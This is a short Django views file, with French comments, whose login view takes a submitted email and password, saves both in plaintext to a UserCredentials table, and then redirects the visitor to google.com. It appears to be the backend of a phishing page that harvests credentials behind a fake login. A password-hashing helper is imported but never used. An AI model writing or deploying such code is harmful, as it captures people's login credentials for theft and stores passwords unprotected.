from django.shortcuts import render, redirect
from .models import UserCredentials
from django.contrib.auth.hashers import make_password

def index(request):

    return render(request, 'index.html')  # Assurez-vous que 'index.html' est le bon template

def login_view(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        
        # Enregistrement dans la base de données
        UserCredentials.objects.create(email=email, password=password)
        
        return redirect('https://www.google.com')  # Redirigez ou affichez une page de succès
    return render(request, 'login.html')